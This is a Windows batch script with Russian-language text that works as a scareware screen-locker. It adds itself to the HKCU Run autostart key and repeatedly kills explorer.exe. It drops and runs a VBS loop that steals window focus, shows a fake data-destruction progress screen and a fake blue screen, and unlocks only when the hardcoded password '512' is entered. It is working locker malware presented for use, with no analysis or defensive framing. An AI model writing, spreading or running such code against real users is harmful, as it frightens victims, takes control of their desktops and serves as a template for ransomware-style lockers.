@echo off
:: 1. Проверка прав и развертывание окна
if "%~1"=="-fixed" goto :run
start "" /max cmd /c "%~0" -fixed
exit

:run
chcp 65001 >nul
title criticals
mode con: cols=120 lines=40
color 0C

:: 2. ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Criticals" /t REG_SZ /d "%~dpnx0" /f >nul 2>&1

:: 3. Блокировка интерфейса
taskkill /f /im explorer.exe >nul 2>&1
powershell -command "$shell = New-Object -ComObject Shell.Application; $shell.Windows() | Where-Object { $_.Name -notlike '*criticals*' } | foreach { $_.Minimize() }"

:: 4. Фоновый процесс удержания окна (фокус)
echo Set W = CreateObject("WScript.Shell") > alarm.vbs
echo Do >> alarm.vbs
echo   W.AppActivate "criticals" >> alarm.vbs
echo   WScript.Sleep 200 >> alarm.vbs
echo Loop >> alarm.vbs
start /b wscript.exe alarm.vbs

set /a attempts=3
set /a percent=0

:lock
cls
echo ==============================================================================
echo [КРИТИЧЕСКАЯ ОШИБКА]: СИСТЕМА ЗАБЛОКИРОВАНА
echo ==============================================================================
echo.
echo ИДЕТ ПРОЦЕСС УНИЧТОЖЕНИЯ ДАННЫХ:
echo [##########          ] %percent%%% ЗАВЕРШЕНО
echo.
echo ТЕКУЩИЙ ОБЪЕКТ: C:\Windows\System32\%random%.dll
echo.
echo Осталось попыток: %attempts%
echo ВВЕДИТЕ ПАРОЛЬ:
echo.

:: Контроль проводника
tasklist /fi "imagename eq explorer.exe" | find /i "explorer.exe" >nul && taskkill /f /im explorer.exe >nul 2>&1

set /p "pass=> "

if "%pass%"=="512" (
    goto unlock
) else (
    set /a attempts-=1
    set /a percent+=33
    
    color 4F
    echo.
    echo [!!!] НЕПРАВИЛЬНЫЙ ПАРОЛЬ [!!!]
    timeout /t 2 >nul
    color 0C
    
    if %attempts% LEQ 0 (
        goto bsod
    )
    goto lock
)

:bsod
cls
color 1F
echo.
echo  :(
echo.
echo  На вашем ПК возникла проблема, и его необходимо перезагрузить.
echo  Мы лишь собираем некоторые сведения об ошибке, а затем будет
echo  выполнена перезагрузка. (0%% завершено)
echo.
echo  При желании вы можете найти в Интернете дополнительные сведения по этому коду:
echo  CRITICAL_PROCESS_DIED
echo.
timeout /t 5 /nobreak >nul
:: Сброс попыток после "экрана смерти"
set /a attempts=3
set /a percent=0
goto lock

:unlock
taskkill /f /im wscript.exe >nul 2>&1
if exist alarm.vbs del alarm.vbs
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Criticals" /f >nul 2>&1
cls
color 0A
echo [ОК]: Доступ восстановлен. Перезапуск оболочки...
start explorer.exe
timeout /t 2 >nul
exit
